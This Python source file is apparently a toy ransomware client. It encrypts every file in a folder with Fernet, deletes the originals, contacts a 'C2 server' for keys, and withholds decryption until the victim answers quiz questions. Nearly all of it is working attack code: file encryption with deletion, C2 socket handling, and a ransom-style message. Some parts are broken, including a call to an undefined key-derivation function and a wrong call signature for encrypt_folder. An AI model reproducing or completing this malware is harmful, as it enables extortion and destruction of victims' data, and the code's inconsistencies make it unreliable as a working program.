import os
import base64
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import getpass
import socket
import threading
import enum

class Requests(enum.Enum):
    ENCRYPT = "ENCRYPT"
    CHECK_ANSWERS = "CHECK_ANSWERS"
    ANSWER_VERIFICATION = "ANSWER_VERIFICATION"
    REQUEST_DECRYPTION_KEY = "REQUEST_DECRYPTION_KEY"
    NOT_ENOUGH_CORRECT_ANSWERS = "NOT_ENOUGH_CORRECT_ANSWERS"
    EXIT = "EXIT"

def encrypt_file(file_path: str, cipher: Fernet) -> bool:
    """
    Encrypt a single file using Fernet (AES-256).
    
    Args:
        file_path: Path to the file to encrypt
        cipher: Fernet cipher object
    
    Returns:
        bool: True if successful, False otherwise
    """
    try:
        # Read the original file
        with open(file_path, 'rb') as file:
            file_data = file.read()
        
        # Encrypt the data
        encrypted_data = cipher.encrypt(file_data)
        
        # Write encrypted data back to file (with .encrypted extension)
        encrypted_file_path = str(file_path) + '.encrypted'
        with open(encrypted_file_path, 'wb') as file:
            file.write(encrypted_data)
        
        # Remove the original file (optional - be careful!)
        os.remove(file_path)
        
        print(f"✓ Encrypted: {file_path}")
        return True
        
    except Exception as e:
        print(f"✗ Failed to encrypt {file_path}: {str(e)}")
        return False

def encrypt_folder(key, salt, folder_path: str, save_salt: bool = True) -> bool:
    """
    Encrypt all files in a given folder using AES-256.
    
    Args:
        key: The encryption key
        salt: The salt for key derivation
        folder_path: Path to the folder containing files to encrypt
        save_salt: Whether to save the salt to a file (for decryption)
    
    Returns:
        bool: True if successful, False otherwise
    """
    # Convert to Path object
    folder = Path(folder_path)
    
    if not folder.exists() or not folder.is_dir():
        print(f"Error: {folder_path} is not a valid directory")
        return False
    
    # Create Fernet cipher
    cipher = Fernet(key)
    
    # Save salt for decryption (if requested)
    if save_salt:
        salt_path = folder / '.salt'
        with open(salt_path, 'wb') as salt_file:
            salt_file.write(salt)
        print(f"✓ Salt saved to {salt_path} (keep this safe for decryption!)")
    
    # Get all files in the folder (excluding directories and hidden files)
    files_to_encrypt = []
    for item in folder.iterdir():
        if item.is_file() and not item.name.startswith('.') and not item.name.endswith('.encrypted'):
            files_to_encrypt.append(item)
    
    if not files_to_encrypt:
        print("No files found to encrypt in the folder.")
        return True
    
    print(f"\nFound {len(files_to_encrypt)} files to encrypt...")
    
    # Encrypt each file
    successful = 0
    for file_path in files_to_encrypt:
        if encrypt_file(str(file_path), cipher):
            successful += 1
    
    print(f"\nEncryption complete! {successful}/{len(files_to_encrypt)} files encrypted successfully.")
    
    # Create a README with instructions (optional)
    readme_path = folder / 'ENCRYPTION_INFO.txt'
    with open(readme_path, 'w') as readme:
        readme.write("FOLDER ENCRYPTION INFORMATION\n")
        readme.write("==============================\n\n")
        readme.write("This folder contains encrypted files (.encrypted extension).\n")
        readme.write("To decrypt these files, use the decrypt_folder() function with:\n")
        readme.write("- The same password used for encryption\n")
        readme.write("- The salt file (.salt) if it was saved\n\n")
        readme.write("WARNING: Without the correct password and salt, decryption is impossible!\n")
    
    return True

def decrypt_folder(folder_path: str, password: str = None, salt_path: str = None) -> bool:
    """
    Decrypt all encrypted files in a given folder.
    
    Args:
        folder_path: Path to the folder containing encrypted files
        password: Password for decryption (if None, prompts user)
        salt_path: Path to the salt file (if None, looks for .salt in folder)
    
    Returns:
        bool: True if successful, False otherwise
    """
    # Get password if not provided
    if password is None:
        password = getpass.getpass("Enter decryption password: ")
    
    # Get folder path
    folder = Path(folder_path)
    
    if not folder.exists() or not folder.is_dir():
        print(f"Error: {folder_path} is not a valid directory")
        return False
    
    # Get salt
    if salt_path is None:
        salt_path = folder / '.salt'
    else:
        salt_path = Path(salt_path)
    
    if not salt_path.exists():
        print(f"Error: Salt file not found at {salt_path}")
        return False
    
    # Read salt
    with open(salt_path, 'rb') as salt_file:
        salt = salt_file.read()
    
    # Generate key from password and salt
    key, _ = generate_key_from_password(password, salt)
    
    # Create Fernet cipher
    cipher = Fernet(key)
    
    # Find all encrypted files
    encrypted_files = list(folder.glob('*.encrypted'))
    
    if not encrypted_files:
        print("No encrypted files found in the folder.")
        return True
    
    print(f"\nFound {len(encrypted_files)} encrypted files to decrypt...")
    
    # Decrypt each file
    successful = 0
    for encrypted_path in encrypted_files:
        try:
            # Read encrypted data
            with open(encrypted_path, 'rb') as file:
                encrypted_data = file.read()
            
            # Decrypt data
            decrypted_data = cipher.decrypt(encrypted_data)
            
            # Write decrypted data (remove .encrypted extension)
            original_path = encrypted_path.with_suffix('')
            with open(original_path, 'wb') as file:
                file.write(decrypted_data)
            
            # Remove encrypted file
            os.remove(encrypted_path)
            
            print(f"✓ Decrypted: {encrypted_path}")
            successful += 1
            
        except Exception as e:
            print(f"✗ Failed to decrypt {encrypted_path}: {str(e)}")
    
    print(f"\nDecryption complete! {successful}/{len(encrypted_files)} files decrypted successfully.")
    return True


def validate_question(question: str, server_socket: socket):
    while True:
        answer = input(f"{question}\nYour answer: ")
        server_socket.send(f"{Requests.CHECK_ANSWERS.value}:{question}:{answer}".encode())
        response = server_socket.recv(1024).decode()
        if response.startswith("ANSWER_VERIFICATION:"):
            verification_result = response.split(":", 1)[1]
        if verification_result == "True":
            print("Correct answer! Let's go for the next question.")
            break
        else:
            print("Incorrect answer. Try again later.")

def questions(server_socket: socket):
    print("YOUR FILES HAVE BEEN ENCRYPTED!")
    print("Answer the following questions to get the decryption key:")
    
    validate_question("What is the capital of France?", server_socket)
    validate_question("What is 2 + 2?", server_socket)
    validate_question("What color do you get when you mix red and white?", server_socket)

def handle_server_communication(server_socket: socket):
    """
    Handle communication with the C2 server.
    
    Args:
        client_socket: Socket connected to the C2 server
    """
    try:
        while True:
            server_socket.send(Requests.ENCRYPT.value.encode())
            response = server_socket.recv(1024).decode()
            if not response:
                print("C2 server disconnected.")
                break
            print(f"Received response from C2 server: {response}")
            response_parts = response.split("::")
            if len(response_parts) == 2:
                key = response_parts[0].encode()
                salt = response_parts[1].encode()
                print(f"Received encryption key and salt from C2 server.")
                # Here you would implement the logic to use the key and salt for encryption
                # For demonstration, we just print them
                print(f"Key: {key}")
                print(f"Salt: {salt}")
            else:
                print("Invalid response format from C2 server.")
            
            #encrypt with the received key and salt
            encrypt_folder(key, salt, "/test", save_salt=False)

            del key
            del salt
            questions(server_socket)

            server_socket.send(Requests.REQUEST_DECRYPTION_KEY.value.encode())
            response = server_socket.recv(1024).decode()
            if response.startswith(Requests.NOT_ENOUGH_CORRECT_ANSWERS.value):
                print("Not enough correct answers to receive the decryption key, too bad :D")
            else:
                response_parts = response.split("::")
                if len(response_parts) == 2:
                    key = response_parts[0].encode()
                    salt = response_parts[1].encode()
                    print(f"Received decryption key and salt from C2 server.")
                    print(f"Key: {key}")
                    print(f"Salt: {salt}")
                    decrypt_folder("/test", password=None, salt_path=None)
                else:
                    print("Invalid response format from C2 server, too bad :D")

    except Exception as e:
        print(f"Error communicating with C2 server: {str(e)}")
    finally:
        server_socket.close()
        print("Connection to C2 server closed.")

def connect_to_server(server_ip: str, server_port: int):
    """
    Connect to the C2 server and handle communication.
    
    Args:
        server_ip: IP address of the C2 server
        server_port: Port number of the C2 server
    """

    
    # Create a TCP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the server
        server_socket.connect((server_ip, server_port))
        print(f"Connected to C2 server at {server_ip}:{server_port}")
        
        # Handle communication in a separate thread
        threading.Thread(target=handle_server_communication, args=(server_socket,)).start()
        
    except Exception as e:
        print(f"Failed to connect to C2 server: {str(e)}")
        server_socket.close()


# Example usage and testing
if __name__ == "__main__":
    # Example 1: Encrypt all files in a folder
    folder_to_encrypt = input("Enter folder path to encrypt: ").strip()
    
    if folder_to_encrypt:
        print("\n--- ENCRYPTION MODE ---")
        success = encrypt_folder(folder_to_encrypt)
        
        if success:
            print("\nFolder encrypted successfully!")
            print("Remember your password - without it, files cannot be recovered!")
    
    # Uncomment below for decryption example
    """
    print("\n--- DECRYPTION MODE ---")
    folder_to_decrypt = input("Enter folder path to decrypt: ").strip()
    if folder_to_decrypt:
        success = decrypt_folder(folder_to_decrypt)
        if success:
            print("Folder decrypted successfully!")
    """